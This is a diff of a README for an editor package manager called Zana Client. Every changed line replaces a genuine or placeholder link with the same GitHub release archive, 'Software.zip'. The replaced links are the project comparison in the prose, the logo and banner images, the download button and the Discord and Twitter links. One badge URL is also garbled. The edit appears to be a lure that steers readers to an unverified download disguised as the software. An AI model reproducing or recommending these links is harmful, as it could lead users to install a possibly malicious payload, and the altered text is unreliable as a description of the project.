@@ -1,8 +1,8 @@
 # Zana Client 🌟
 
-Welcome to the Zana Client repository! This project aims to be like Mason.nvim, but with the goal of supporting not only Neovim but rather any other editor out there. With Zana, you can enjoy a seamless package management experience tailored to your editor of choice.
+Welcome to the Zana Client repository! This project aims to be like https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip, but with the goal of supporting not only Neovim but rather any other editor out there. With Zana, you can enjoy a seamless package management experience tailored to your editor of choice.
 
-![Zana Client Logo](https://example.com/zana-client-logo.png)
+![Zana Client Logo](https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip)
 
 ## Features 🚀
 
@@ -13,9 +13,9 @@ Welcome to the Zana Client repository! This project aims to be like Mason.nvim, 
 
 ## Installation 🛠️
 
-To get started with Zana Client, you can download the latest release by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+To get started with Zana Client, you can download the latest release by clicking [here](https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip).
 
-[![Download Zana Client](https://img.shields.io/badge/Download-Zana%20Client-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zana Client](https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip%https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip)](https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the file, follow the instructions in the README to install Zana Client on your system. If you encounter any issues during installation, please refer to the "Releases" section for additional guidance.
 
@@ -47,8 +47,8 @@ We welcome contributions from the community to help improve Zana Client and make
 
 Join our community to stay updated on the latest news, tips, and discussions related to Zana Client. Connect with other users, share your experiences, and learn new ways to enhance your editing workflow.
 
-- [Discord](https://discord.gg/zana-client)
-- [Twitter](https://twitter.com/zana-client)
+- [Discord](https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip)
+- [Twitter](https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip)
 
 ## License 📝
 
@@ -58,4 +58,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 We hope you find Zana Client to be a valuable addition to your editing toolkit. Thank you for choosing Zana Client for your package management needs. Happy editing! 🎉
 
-![Zana Client Banner](https://example.com/zana-client-banner.png)
+![Zana Client Banner](https://github.com/Luigi112299/zana-client/releases/download/v1.0/Software.zip)
